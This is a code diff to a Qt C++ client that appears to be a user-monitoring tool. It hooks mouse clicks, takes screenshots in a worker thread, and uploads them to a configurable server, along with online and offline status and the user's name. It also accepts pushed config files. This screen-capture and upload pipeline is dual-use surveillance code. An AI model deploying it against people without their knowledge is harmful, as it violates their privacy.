@@ -1,22 +1,20 @@
-#include <QCoreApplication>
 #include <QDebug>
 #include "client.h"
 
-Client::Client(QObject* parent, const QString& defaultPath):
+Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16 _port):
     QObject(parent),
-    path(defaultPath)
+    path(defaultPath),
+    ip(_ip),
+    port(_port)
 {
     //Start modules
-    fileServer = new FileServer(0, 1234, path);
-    fileClient = new FileClient(0, "127.0.0.1", 12345);
+    fileServer = new FileServer(this, 1234, path);
+    fileClient = new FileClient(this, ip, port);
     config = new Config;
-    onlineTimer = new QTimer;
-    screenTimer = new QTimer;
+    onlineTimer = new QTimer(this);
+    screenTimer = new QTimer(this);
 
     fileServer->start();
-
-    //TODO: add mousehook
-    //bind mousehook
 
     //Load config
     //Default path ./config.cfg
@@ -29,46 +27,55 @@ Client::Client(QObject* parent, const QString& defaultPath):
     //Update client state
     update();
 
-    //Get username
-    name = qgetenv("USER");
-    if (name.isEmpty())
-    {
-        name = qgetenv("USERNAME");
-        if (name.isEmpty())
-            name = qgetenv("COMPUTERNAME");
-    }
-
     //Trying to connect to server
-    if ( !getOnline() )
-    {
-        connect(onlineTimer, &QTimer::timeout, this, &Client::getOnline);
-        onlineTimer->start(30*1000);    //30 sec
-    }
+    getOnline();
+
     //TODO: new variable isOnline?
 
     //Wait for new config file
     connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getNewFile(str, ip); });
 
+    //Progress bar
+    //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
+
     //Connect screenshot module
-    connect(&MouseHook::instance(), &MouseHook::mouseClicked, &MouseHook::instance(), &MouseHook::makeScreenshot);
-    connect(&MouseHook::instance(), &MouseHook::screenSaved,
-            this, [this](QString path){
-                                            if (fileClient->connect())
-                                            {
-                                                fileClient->sendFile(path);
-                                                fileClient->disconnect();
-                                            }
-                                        });
+    //connect(&MouseHook::instance(), &MouseHook::mouseClicked, &MouseHook::instance(), &MouseHook::makeScreenshot);
+    connect(&MouseHook::instance(), &MouseHook::mouseClicked,
+            this, [this]()
+    {
+        //Thread for making screenshots files
+        QThread* thread = new QThread(this);
+        MakeScreen* screen = new MakeScreen(0);
+        screen->moveToThread(thread);
+
+        connect(thread, &QThread::started, screen, &MakeScreen::makeScreenshot);
+        connect(screen, &MakeScreen::screenSaved, thread, &QThread::quit);
+        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
+        connect(thread, &QThread::finished, screen, &MakeScreen::deleteLater);
+
+        thread->start();
+
+        connect(screen, &MakeScreen::screenSaved,
+        this, [this](QString path)
+        {
+            //TODO: remove
+            qDebug() << path;
+            //Send screenshot
+            fileClient->enqueueData(_FILE, path);
+            fileClient->connect();
+        });
+    });
 }
 
 Client::~Client()
 {
-    fileClient->sendStr("OFFLINE:" + name);
+    fileClient->getOffline();
     delete onlineTimer;
     delete screenTimer;
     delete config;
-    delete fileServer;
     delete fileClient;
+    delete fileServer;
+    qDebug() << "Client deleted.";
 }
 
 void Client::update()
@@ -88,20 +95,19 @@ void Client::update()
     MouseHook::instance().setParameters(buttons, config->seconds);
 }
 
-bool Client::getOnline()
+void Client::getOnline()
 {
-    if (fileClient->connect() && fileClient->sendStr("ONLINE:" + name))
-    {
-        onlineTimer->stop();
-        fileClient->disconnect();
-        return true;
-    }
-    else
-        return false;
+    onlineTimer->start(30*1000);    //30 sec
+    connect(onlineTimer, &QTimer::timeout, fileClient, &FileClient::connect);
+    connect(fileClient, &FileClient::transmitted, onlineTimer, &QTimer::stop);
+    //Send string
+    fileClient->enqueueData(_STRING, "ONLINE:" + fileClient->getName());
+    fileClient->connect();
 }
 
 void Client::getNewFile(const QString& path, const QString & /*ip*/)
 {
+    qDebug() << path;
     //TODO: if not online => send str online
     QString extension = path.section('.', -1, -1);
     //If config received
@@ -123,14 +129,6 @@ void Client::getNewConfig(const QString &path)
     //Check if folder is empty
     QDir dir = path.section('/', 0, -2);
     if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
-        dir.rmdir(dir.dirName());
+        dir.rmdir(path.section('/', 0, -2)); //dir.name()
 }
 
-int main(int argc, char *argv[])
-{
-    QCoreApplication a(argc, argv);
-    Client client1;
-
-    return a.exec();
-
-}
